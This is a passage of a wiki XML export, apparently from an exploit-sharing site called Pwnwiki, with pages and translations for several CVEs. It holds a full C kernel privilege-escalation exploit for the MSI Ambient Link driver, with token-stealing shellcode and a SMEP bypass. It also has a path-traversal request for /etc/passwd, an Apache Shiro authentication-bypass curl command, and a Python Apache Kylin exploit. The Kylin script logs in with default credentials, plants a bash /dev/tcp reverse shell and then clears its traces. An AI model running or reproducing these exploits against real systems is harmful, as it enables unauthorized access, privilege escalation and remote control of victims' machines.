        NULL);

    if (hMsio == INVALID_HANDLE_VALUE) {
        printf("[-] Error obtaining an handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    return hMsio;
}

int main() {
    puts("[*] CVE-2020-17382 - Win10 1709 - PoC by Matteo 'uf0' Malvica");
    DWORD IoControlCode = 0x80102040;
    HANDLE hDevice = GetDriverHandle();
    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    DWORD pid = GetCurrentProcessId();

    eopMsio(hDevice, nt, pid, IoControlCode);

    return 0;
}
&lt;/pre&gt;</text>
      <sha1>2zl534euus2st4bwmbwwpogo4mjjq8j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-17382 MSI Ambient Link Driver 1.0.0.8 本地權限提升漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4352</id>
    <revision>
      <id>5003</id>
      <timestamp>2021-06-13T01:56:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>5003</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7315" sha1="nkjieqw3zchizlibgagsece449dm743" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
Version: 1.0.0.8
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
/*
Exploit Title: MSI Ambient Link Driver 1.0.0.8 - Local Privilege Escalation
Date: 2020-09-24
Exploit Author: Matteo Malvica
Vendor Homepage: https://www.msi.com
Software Link: https://msi.gm/ABLTMNB
Driver: MSIO64.sys
SHA256: 525D9B51A80CA0CD4C5889A96F857E73F3A80DA1FFBAE59851E0F51BDFB0B6CD
Version: 1.0.0.8
Tested on: Windows 10 1709 [19041.1.amd64fre.vb_release.191206-1406]
MSI Ambient Link Driver 1.0.0.8 Kernel Stack Based Buffer Overflow / Local Privilege Escalation
CVE: CVE-2020-17382
Writeup: https://www.matteomalvica.com/blog/2020/09/24/weaponizing-cve-2020-17382/
Original advisory: https://www.coresecurity.com/core-labs/advisories/msi-ambient-link-multiple-vulnerabilities
*/

#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;
#include &lt;Psapi.h&gt;

#pragma warning( disable : 6387 )

VOID eopMsio(HANDLE hFile, INT64 kernel_base, DWORD pid, DWORD IoControlCode) {
          // SHELLCODE FOR 1709
          BYTE token_steal[] =
          "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"      // mov rdx, [gs:188h]       ; Get _ETHREAD pointer from KPCR
          "\x4C\x8B\x82\xB8\x00\x00\x00"              // mov r8, [rdx + b8h]      ; _EPROCESS (kd&gt; u PsGetCurrentProcess)
          "\x4D\x8B\x88\xe8\x02\x00\x00"              // mov r9, [r8 + 2e8h]      ; ActiveProcessLinks list head
          "\x49\x8B\x09"                              // mov rcx, [r9]            ; Follow link to first process in list
          //find_system_proc:
          "\x48\x8B\x51\xF8"                          // mov rdx, [rcx - 8]       ; Offset from ActiveProcessLinks to UniqueProcessId
          "\x48\x83\xFA\x04"                          // cmp rdx, 4               ; Process with ID 4 is System process
          "\x74\x05"                                  // jz found_system          ; Found SYSTEM token
          "\x48\x8B\x09"                              // mov rcx, [rcx]           ; Follow _LIST_ENTRY Flink pointer
          "\xEB\xF1"                                  // jmp find_system_proc     ; Loop
          //found_system:
          "\x48\x8B\x41\x70"                          // mov rax, [rcx + 70h]     ; Offset from ActiveProcessLinks to Token
          "\x24\xF0"                                  // and al, 0f0h             ; Clear low 4 bits of _EX_FAST_REF structure
          //find cmd
          "\x48\x8B\x51\xF8"                          // mov rdx, [rcx-8]         ;ActiveProcessLinks - 8 = UniqueProcessId
          "\x48\x81\xFA\x99\x99\x00\x00"              // cmp rdx, 0d54h           ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
          "\x74\x05"                                  // jz found_cmd             ;YES - move on
          "\x48\x8B\x09"                              // mov rcx, [rcx]           ;NO - next entry in list
          "\xEB\xEE"                                  // jmp find_cmd             ;loop
          // found cmd
          "\x48\x89\x41\x70"                          // mov [rcx+70h], rax       ;copy SYSTEM token over top of this process's token
          "\x48\x31\xc9"                              // xor rcx rcx              ; clear some registers to avoid issues while unwinding the call stack
          "\x48\x31\xc0"                              // xor rax rax
          "\x48\x31\xf6"                              // xor rsi,rsi
          "\x48\x31\xff"                              // xor rdi, rdi
          "\x4D\x31\xC0"                              // xor r8, r8
          "\x48\xc7\xc1\xf8\x06\x15\x00"              // mov rcx, 0x1506f8        ; move original cr4 value into rcx
          "\xc3";                                     // ret                      ; RET

    token_steal[54] = pid;
    token_steal[55] = pid &gt;&gt; 8;

    LPVOID allocated_shellcode = VirtualAlloc(NULL,
        sizeof(token_steal),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(allocated_shellcode, token_steal, sizeof(token_steal));

    INT64 pop_rcx_offset = kernel_base + 0x15fc70;            // gadget 1 1709 - pop rcx ; ret
    INT64 mov_cr4_offset = kernel_base + 0x76a02;             // gadget 2 1709 - mov cr4, ecx ; ret
    INT64 wbindv_offset = kernel_base + 0x1175c0;;            // gadget 3 1709 - wbinvd; ret
    INT64 rcx_value = 0x506f8;                                // value we want placed in cr4 in order to disable SMEP
    INT64 rcx_old_value = 0x1506f8;                           // original cr4 value         
    INT64 ret = pop_rcx_offset + 1;                           // RET NOP

    puts("[+] SMEP disabled");
    
    BYTE  input_buff[136] = { 0 };
    memset(input_buff, '\x41', 64);
    memset(input_buff, '\x42', 8);                            // dummy RBP
    memcpy(input_buff + 72, (PINT64)&amp;pop_rcx_offset, 8);      // pop rcx
    memcpy(input_buff + 80, (PINT64)&amp;rcx_value, 8);           // disable SMEP value
    memcpy(input_buff + 88, (PINT64)&amp;mov_cr4_offset, 8);      // mov cr4, rcx
    memcpy(input_buff + 96, (PINT64)&amp;wbindv_offset, 8);       // wbinvd; ret
    memcpy(input_buff + 104, (PINT64)&amp;allocated_shellcode, 8);// shellcode
    memcpy(input_buff + 112, (PINT64)&amp;mov_cr4_offset, 8);     // mov cr4, rcx 
    memcpy(input_buff + 120, (PINT64)&amp;ret, 8);                // RETNOP to restore the stack
    memcpy(input_buff + 128, (PINT64)&amp;ret, 8);                // RETNOP to restore the stack

    printf("[+] Payload buffer located at: 0x%p\n", &amp;allocated_shellcode);

    DWORD lpBytesReturned = 0x0;
    BOOL triggerIOCTL = DeviceIoControl(hFile,
        IoControlCode,
        input_buff,
        sizeof(input_buff),
        NULL,
        0,
        &amp;lpBytesReturned,
        NULL);

    if (!triggerIOCTL) {
        printf("[!] DeviceIoControl failed: %d\n", GetLastError());
    }
    else {
        puts("[+] SMEP re-enabled");
        puts("[+] Enjoy your SYSTEM shell\n");
    }

    system("start cmd.exe");
}

LPVOID GetBaseAddr(const char* drvname) {
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp;&amp; cbNeeded &lt; sizeof(drivers)) {
        char szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i &lt; nDrivers; i++) {
            if (GetDeviceDriverBaseNameA(drivers[i], (LPSTR)szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (strcmp(szDrivers, drvname) == 0) {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}

HANDLE GetDriverHandle() {
    HANDLE hMsio;

    hMsio = CreateFileA("\\\\.\\MsIo",
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hMsio == INVALID_HANDLE_VALUE) {
        printf("[-] Error obtaining an handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    return hMsio;
}

int main() {
    puts("[*] CVE-2020-17382 - Win10 1709 - PoC by Matteo 'uf0' Malvica");
    DWORD IoControlCode = 0x80102040;
    HANDLE hDevice = GetDriverHandle();
    INT64 nt = (INT64)GetBaseAddr("ntoskrnl.exe");
    DWORD pid = GetCurrentProcessId();

    eopMsio(hDevice, nt, pid, IoControlCode);

    return 0;
}
&lt;/pre&gt;</text>
      <sha1>nkjieqw3zchizlibgagsece449dm743</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-17519 Apache Flink目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>264</id>
    <revision>
      <id>411</id>
      <timestamp>2021-03-18T09:45:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; GET /jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd'  &lt;/pre&gt;   ==Github== https://github.com/B1anda0/CVE-2020-17519/blob/main/CVE-2020-175..."</comment>
      <origin>411</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="180" sha1="p0lsp7gpvlfhl7uuwhcqfahwcbdhr74" xml:space="preserve">==POC==
&lt;pre&gt;
GET /jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd' 
&lt;/pre&gt;


==Github==
https://github.com/B1anda0/CVE-2020-17519/blob/main/CVE-2020-17519.py</text>
      <sha1>p0lsp7gpvlfhl7uuwhcqfahwcbdhr74</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-17523 Apache Shiro pathMatches 身份認證繞過漏洞</title>
    <ns>0</ns>
    <id>260</id>
    <revision>
      <id>406</id>
      <timestamp>2021-03-18T09:41:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==條件== &lt;/translate&gt; &lt;pre&gt; Shiro with Spring   /admin/[space] /admin/%20 &lt;/pre&gt;  ==POC== &lt;pre&gt; curl -v http://[Vimtim]/admin/%20/ &lt;/pre&gt;"</comment>
      <origin>406</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="167" sha1="ok1c2qbpez1f0si7kdzp7ju76o8lnv8" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==條件==
&lt;/translate&gt;
&lt;pre&gt;
Shiro with Spring


/admin/[space]
/admin/%20
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -v http://[Vimtim]/admin/%20/
&lt;/pre&gt;</text>
      <sha1>ok1c2qbpez1f0si7kdzp7ju76o8lnv8</sha1>
    </revision>
    <revision>
      <id>407</id>
      <parentid>406</parentid>
      <timestamp>2021-03-18T09:42:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>407</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="178" sha1="btzluesostzxpz9zcgrqvmyes2trymi" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==條件== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Shiro with Spring


/admin/[space]
/admin/%20
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -v http://[Vimtim]/admin/%20/
&lt;/pre&gt;</text>
      <sha1>btzluesostzxpz9zcgrqvmyes2trymi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-17523 Apache Shiro pathMatches 身份認證繞過漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5079</id>
    <revision>
      <id>5819</id>
      <timestamp>2021-06-24T02:13:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==條件=="</comment>
      <origin>5819</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="142" sha1="2zjv0iveoezwaozefe0vsuvmbxsn1yf" xml:space="preserve">&lt;languages  /&gt;

==條件==
&lt;pre&gt;
Shiro with Spring


/admin/[space]
/admin/%20
&lt;/pre&gt;

==POC==
&lt;pre&gt;
curl -v http://[Vimtim]/admin/%20/
&lt;/pre&gt;</text>
      <sha1>2zjv0iveoezwaozefe0vsuvmbxsn1yf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-1956 Apache Kylin 命令注入漏洞</title>
    <ns>0</ns>
    <id>827</id>
    <revision>
      <id>1084</id>
      <timestamp>2021-04-07T05:10:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt;  &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Apache Kylin 2.3.0 ~ 2.3.2  Apache Kylin 2.4.0 ~ 2.4.1  Apache Kylin 2.5.0 ~ 2.5.2  Apache Kylin 2.6.0 ~ 2.6.5..."</comment>
      <origin>1084</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6275" sha1="soqxnklzvmeqng3fnnx8sldft0gtwf6" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Apache Kylin 2.3.0 ~ 2.3.2

Apache Kylin 2.4.0 ~ 2.4.1

Apache Kylin 2.5.0 ~ 2.5.2

Apache Kylin 2.6.0 ~ 2.6.5

Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1
&lt;/pre&gt;

&lt;translate&gt;
打開後使用默認賬號密碼登錄，出現初始界面即為成功
&lt;/translate&gt;
&lt;pre&gt;
admin/KYLIN
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: Apache Kylin &lt;= 3.0.1                                    \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-1956                                    \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:7070                            \033[0m')
    print('+  \033[36mLogin  &gt;&gt;&gt; admin:KYLIN(格式为User:Pass)                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    login_url = target_url + "/kylin/api/user/authentication"
    user_pass = str(input("\033[35mPlease input User and Pass\nLogin &gt;&gt;&gt; \033[0m"))

    Authorization = "Basic " + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Cookie": "project=null"
    }
    try:
        response = requests.post(url=login_url, headers=headers, timeout=20)
        if "password" not in response.text:
            print("\033[31m[x] 账号密码出现错误 \033[0m")
            sys.exit(0)
        else:
            print("\033[32m[o] 成功登录，获得JSESSIONID：" + response.cookies["JSESSIONID"] + "\033[0m")
            return response.cookies["JSESSIONID"],Authorization
    except:
        print("\033[31m[x] 漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, cookie, IP, PORT, Authorization):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled","kylin.tool.auto-migrate-cube.src-config","kylin.tool.auto-migrate-cube.dest-config"]
    value = ["true","echo;bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1;echo".format(IP, PORT), "shell"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID="+cookie
    }
    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] 成功将" + key[i] +"设置为" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] 设置" + key[i] +"为" + value[i] +"失败\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
            sys.exit(0)

def POC_3(target_url, cookie):
    print("\033[35m[o] 正在反弹shell......\033[0m")
    vuln_url = target_url + "/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }
    try:
        response = requests.post(url=vuln_url, headers=headers)
        POC_4(target_url, cookie)
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")
        sys.exit(0)

def POC_4(target_url, cookie):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled", "kylin.tool.auto-migrate-cube.src-config",
           "kylin.tool.auto-migrate-cube.dest-config"]
    value = ["flase", "echo;echo;echo", "None"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }

    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] 成功将" + key[i] +"设置为" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] 设置" + key[i] +"为" + value[i] +"失败\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
            sys.exit(0)
    print("\033[35m[o] 成功清理痕迹\033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    try:
        cookie,Authorization = POC_1(target_url)
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")
        sys.exit(0)
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    POC_2(target_url, cookie, IP, PORT, Authorization)
    POC_3(target_url, cookie)
&lt;/pre&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://poc.wgpsec.org/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956.html</text>
      <sha1>soqxnklzvmeqng3fnnx8sldft0gtwf6</sha1>
    </revision>
    <revision>
      <id>1085</id>
      <parentid>1084</parentid>
      <timestamp>2021-04-07T05:10:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1085</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6308" sha1="dh07lmz4j4ajzbukopgqk0u587ienbd" xml:space="preserve">&lt;languages   /&gt;

&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Apache Kylin 2.3.0 ~ 2.3.2

Apache Kylin 2.4.0 ~ 2.4.1

Apache Kylin 2.5.0 ~ 2.5.2

Apache Kylin 2.6.0 ~ 2.6.5

Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1
&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
打開後使用默認賬號密碼登錄，出現初始界面即為成功
&lt;/translate&gt;
&lt;pre&gt;
admin/KYLIN
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: Apache Kylin &lt;= 3.0.1                                    \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-1956                                    \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:7070                            \033[0m')
    print('+  \033[36mLogin  &gt;&gt;&gt; admin:KYLIN(格式为User:Pass)                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    login_url = target_url + "/kylin/api/user/authentication"
    user_pass = str(input("\033[35mPlease input User and Pass\nLogin &gt;&gt;&gt; \033[0m"))

    Authorization = "Basic " + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Cookie": "project=null"
    }
    try:
        response = requests.post(url=login_url, headers=headers, timeout=20)
        if "password" not in response.text:
            print("\033[31m[x] 账号密码出现错误 \033[0m")
            sys.exit(0)
        else:
            print("\033[32m[o] 成功登录，获得JSESSIONID：" + response.cookies["JSESSIONID"] + "\033[0m")
            return response.cookies["JSESSIONID"],Authorization
    except:
        print("\033[31m[x] 漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, cookie, IP, PORT, Authorization):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled","kylin.tool.auto-migrate-cube.src-config","kylin.tool.auto-migrate-cube.dest-config"]
    value = ["true","echo;bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1;echo".format(IP, PORT), "shell"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID="+cookie
    }
    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] 成功将" + key[i] +"设置为" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] 设置" + key[i] +"为" + value[i] +"失败\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
            sys.exit(0)

def POC_3(target_url, cookie):
    print("\033[35m[o] 正在反弹shell......\033[0m")
    vuln_url = target_url + "/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }
    try:
        response = requests.post(url=vuln_url, headers=headers)
        POC_4(target_url, cookie)
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")
        sys.exit(0)

def POC_4(target_url, cookie):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled", "kylin.tool.auto-migrate-cube.src-config",
           "kylin.tool.auto-migrate-cube.dest-config"]
    value = ["flase", "echo;echo;echo", "None"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID=" + cookie
    }

    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] 成功将" + key[i] +"设置为" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] 设置" + key[i] +"为" + value[i] +"失败\033[0m")
                sys.exit(0)
        except:
            print("\033[31m[x] 漏洞利用失败 \033[0m")
            sys.exit(0)
    print("\033[35m[o] 成功清理痕迹\033[0m")


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
    try:
        cookie,Authorization = POC_1(target_url)
    except:
        print("\033[31m[x] 漏洞利用失败 \033[0m")
        sys.exit(0)
    IP = str(input("\033[35m请输入监听IP   &gt;&gt;&gt; \033[0m"))
    PORT = str(input("\033[35m请输入监听PORT &gt;&gt;&gt; \033[0m"))
    POC_2(target_url, cookie, IP, PORT, Authorization)
    POC_3(target_url, cookie)
&lt;/pre&gt;


&lt;translate&gt;
==參考== &lt;!--T:3--&gt;
&lt;/translate&gt;
https://poc.wgpsec.org/PeiQi_Wiki/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956.html</text>
      <sha1>dh07lmz4j4ajzbukopgqk0u587ienbd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-1956 Apache Kylin 命令注入漏洞/ru</title>
    <ns>0</ns>
    <id>4467</id>
    <revision>
      <id>5142</id>
      <timestamp>2021-06-16T01:59:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Ссылка =="</comment>
      <origin>5142</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6363" sha1="pskwymtppqbzpfi9h51glpm541397no" xml:space="preserve">&lt;languages   /&gt;

==Затронутая версия==
&lt;pre&gt;
Apache Kylin 2.3.0 ~ 2.3.2

Apache Kylin 2.4.0 ~ 2.4.1

Apache Kylin 2.5.0 ~ 2.5.2

Apache Kylin 2.6.0 ~ 2.6.5

Apache Kylin 3.0.0-alpha, Apache Kylin 3.0.0-alpha2, Apache Kylin 3.0.0-beta, Apache Kylin 3.0.0, Kylin 3.0.1
&lt;/pre&gt;

После открытия войдите в систему с учетной записью и паролем по умолчанию, и начальный интерфейс будет успешным.
&lt;pre&gt;
admin/KYLIN
&lt;/pre&gt;

==POC==
&lt;pre&gt;
#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : PeiQi
# from   : http://wiki.peiqi.tech

import requests
import base64
import sys


def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号 : PeiQi文库                                                     \033[0m')
    print('+  \033[34mVersion: Apache Kylin &lt;= 3.0.1                                    \033[0m')
    print('+  \033[36m使用格式: python3 CVE-2020-1956                                    \033[0m')
    print('+  \033[36mUrl    &gt;&gt;&gt; http://xxx.xxx.xxx.xxx:7070                            \033[0m')
    print('+  \033[36mLogin  &gt;&gt;&gt; admin:KYLIN(格式为User:Pass)                            \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    login_url = target_url + "/kylin/api/user/authentication"
    user_pass = str(input("\033[35mPlease input User and Pass\nLogin &gt;&gt;&gt; \033[0m"))

    Authorization = "Basic " + str((base64.b64encode(user_pass.encode('utf-8'))),'utf-8')
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Cookie": "project=null"
    }
    try:
        response = requests.post(url=login_url, headers=headers, timeout=20)
        if "password" not in response.text:
            print("\033[31m[x] 账号密码出现错误 \033[0m")
            sys.exit(0)
        else:
            print("\033[32m[o] 成功登录，获得JSESSIONID：" + response.cookies["JSESSIONID"] + "\033[0m")
            return response.cookies["JSESSIONID"],Authorization
    except:
        print("\033[31m[x] 漏洞利用失败\033[0m")
        sys.exit(0)

def POC_2(target_url, cookie, IP, PORT, Authorization):
    config_url = target_url + "/kylin/api/admin/config"

    key = ["kylin.tool.auto-migrate-cube.enabled","kylin.tool.auto-migrate-cube.src-config","kylin.tool.auto-migrate-cube.dest-config"]
    value = ["true","echo;bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1;echo".format(IP, PORT), "shell"]

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Authorization": Authorization,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json;charset=UTF-8",
        "Pragma": "no-cache",
        "Cookie": "project=null;JSESSIONID="+cookie
    }
    for i in range(0,3):
        data = """{"key":"%s","value":"%s"}""" % (key[i], value[i])
        try:
            response = requests.put(url=config_url, headers=headers, data=data, timeout=20)
            if response.status_code == 200:
                print("\033[32m[o] 成功将" + key[i] +"设置为" + value[i] +"\033[0m")
            else:
                print("\033[31m[x] 设置" + key[i] +"为" + value[i] +"失败\033[0m")
                sys.exit(0)
